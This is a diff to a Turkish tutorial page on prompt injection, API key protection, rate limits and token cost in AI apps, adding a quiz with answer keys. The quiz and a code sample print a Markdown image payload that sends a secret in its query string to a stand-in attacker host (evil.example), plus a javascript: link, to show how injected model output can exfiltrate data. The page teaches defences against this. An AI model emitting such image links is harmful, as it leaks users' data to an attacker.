@@ -3,6 +3,41 @@ title: "Güvenlik ve maliyet"
 description: "Prompt injection, API anahtarı koruma, rate limit ve token maliyeti."
 lastVerified: "2026-11-03"
 translationKey: "ai/security-and-cost"
+quiz:
+  - question: "Model çıktısındaki bu Markdown varsayılan ayarlı `react-markdown` ile render edilirse ne olur?"
+    lang: markdown
+    code: |-
+      ![x](https://evil.example/c.png?d=SECRET-ORDER-1042)
+    options:
+      - "`href` boşaltılır"
+      - "Görsel render edilir ve tarayıcı istek atınca sorgudaki veri saldırganın sunucusuna gider"
+      - "Metin olarak kaçırılır"
+      - "Görsel engellenir"
+    answer: 1
+    explanation: "`react-markdown` script ve `javascript:` tarafında güvenlidir ama dış görseli açık bırakır. `components={{ img: () => null }}` ile görseli kapatın; `img-src 'self'` içeren bir CSP ikinci kat olur."
+  - question: "Bellekte tutulan bu rate limiter canlıda neden güvenilir değildir?"
+    lang: ts
+    code: |-
+      const hits = new Map<string, number[]>();
+
+      function limit(id: string, max = 3, windowMs = 1000) {
+        // kayan pencere: son windowMs içindeki istekleri say
+      }
+    options:
+      - "Kayan pencere algoritması yanlıştır"
+      - "`429` yerine `403` dönmelidir"
+      - "Bazı barındırma ortamları handler'ları ayrı lambda'larda çalıştırır ve bunlar istekler arasında veri paylaşamaz; sayacı Redis gibi dış bir yerde tutun"
+      - "`Map` çok fazla bellek harcar"
+    answer: 2
+    explanation: "Bellek içi sürüm yalnızca tek süreçte çalışır. Anonim kullanıcıda IP'ye, girişli kullanıcıda kullanıcı kimliğine göre sınırlayın; pahalı modellere daha sıkı sınır koyun."
+  - question: "Düşünen bir modelde çıktı maliyetini `usage` içindeki hangi değere göre hesaplamalısınız?"
+    options:
+      - "Ekranda görünen metnin karakter sayısı"
+      - "`totalTokens - inputTokens`'ın yarısı"
+      - "`outputTokens`"
+      - "`outputTokenDetails.textTokens`"
+    answer: 2
+    explanation: "`reasoningTokens` çıktı tarafında ayrıca görünür ve faturaya girer; fatura ekranda gördüğünüz metinden büyük olabilir. Çok adımlı çağrıda `totalUsage` tüm adımların toplamıdır."
 ---
 
 AI özelliği olan bir uygulamada iki şey sizi yakar: saldırgan modeli yönlendirir ya da fatura kontrolden çıkar. İkisi de aynı yerden başlar. Modelin önüne kimin ne koyabildiğini ve ne kadar kullanabildiğini sınırlamadınız. Bu rehberde dört konuyu sırayla göreceksiniz: prompt injection, API anahtarı koruma, rate limit ve token maliyeti. Örnekler [AI SDK ve Streaming Sohbet](/academy/ai/ai-sdk-and-streaming-chat) rehberindeki `/api/chat` route'undan gidiyor.
@@ -78,7 +113,7 @@ import ReactMarkdown from 'react-markdown';
 import { renderToStaticMarkup } from 'react-dom/server';
 
 const hostile = `
-![x](https://evil.example/c.png?d=GIZLI-SIPARIS-1042)
+![x](https://evil.example/c.png?d=SECRET-ORDER-1042)
 
 [Tıkla](javascript:alert(1))
 
@@ -90,7 +125,7 @@ console.log(renderToStaticMarkup(<ReactMarkdown>{hostile}</ReactMarkdown>));
 
 Varsayılan davranışta çıktı şöyle oldu:
 
-- Görsel, `<img src="https://evil.example/c.png?d=GIZLI-SIPARIS-1042">` olarak render edildi. Yani veri adrese taşındı. Ayrıca bir `<link rel="preload" as="image">` etiketi de üretildi.
+- Görsel, `<img src="https://evil.example/c.png?d=SECRET-ORDER-1042">` olarak render edildi. Yani veri adrese taşındı. Ayrıca bir `<link rel="preload" as="image">` etiketi de üretildi.
 - `javascript:` bağlantısının adresi boşaltıldı (`href=""`).
 - `<script>` ham HTML olarak çalışmadı, metin olarak kaçırıldı.
 
